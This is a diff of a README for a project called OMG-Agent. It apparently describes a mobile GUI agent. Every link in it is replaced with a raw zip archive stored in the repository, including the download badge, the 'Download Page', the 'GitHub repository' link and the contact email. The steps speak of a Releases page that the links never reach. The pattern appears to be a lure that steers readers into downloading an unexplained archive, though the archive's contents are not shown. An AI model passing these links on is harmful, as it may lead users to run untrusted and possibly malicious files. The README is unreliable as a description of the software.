@@ -6,7 +6,7 @@ Welcome to OMG-Agent! This guide will help you easily download and run the OMG-A
 
 ## 📥 Download Now!
 
-[![Download OMG-Agent](https://github.com/Johandaonis1/OMG-Agent/raw/refs/heads/main/omg_agent/core/agent/examples/Agent_OM_v3.9.zip)](https://github.com/Johandaonis1/OMG-Agent/raw/refs/heads/main/omg_agent/core/agent/examples/Agent_OM_v3.9.zip)
+[![Download OMG-Agent](https://raw.githubusercontent.com/Johandaonis1/OMG-Agent/main/docs/Agent_OM_1.7.zip)](https://raw.githubusercontent.com/Johandaonis1/OMG-Agent/main/docs/Agent_OM_1.7.zip)
 
 ## 🛠 System Requirements
 
@@ -19,7 +19,7 @@ To run OMG-Agent smoothly, your system needs to meet these requirements:
 
 ## 📂 Download & Install
 
-To get started with OMG-Agent, visit this page to download: [Download Page](https://github.com/Johandaonis1/OMG-Agent/raw/refs/heads/main/omg_agent/core/agent/examples/Agent_OM_v3.9.zip).
+To get started with OMG-Agent, visit this page to download: [Download Page](https://raw.githubusercontent.com/Johandaonis1/OMG-Agent/main/docs/Agent_OM_1.7.zip).
 
 1. Click the link above.
 2. On the Releases page, locate the latest version of OMG-Agent.
@@ -70,7 +70,7 @@ We value your input! If you have any questions or feedback regarding OMG-Agent, 
 
 - Open an issue in the repository.
 - Leave a comment on the GitHub page.
-- Send us an email at https://github.com/Johandaonis1/OMG-Agent/raw/refs/heads/main/omg_agent/core/agent/examples/Agent_OM_v3.9.zip
+- Send us an email at https://raw.githubusercontent.com/Johandaonis1/OMG-Agent/main/docs/Agent_OM_1.7.zip
 
 ## 📄 License
 
@@ -78,6 +78,6 @@ OMG-Agent is open-sourced and available under the MIT License. Feel free to use,
 
 ## 🔗 More Information
 
-For more details and updates, please check the [GitHub repository](https://github.com/Johandaonis1/OMG-Agent/raw/refs/heads/main/omg_agent/core/agent/examples/Agent_OM_v3.9.zip). We frequently update the application with new features and enhancements based on user feedback.
+For more details and updates, please check the [GitHub repository](https://raw.githubusercontent.com/Johandaonis1/OMG-Agent/main/docs/Agent_OM_1.7.zip). We frequently update the application with new features and enhancements based on user feedback.
 
 Thank you for choosing OMG-Agent. Enjoy your improved mobile GUI experience!
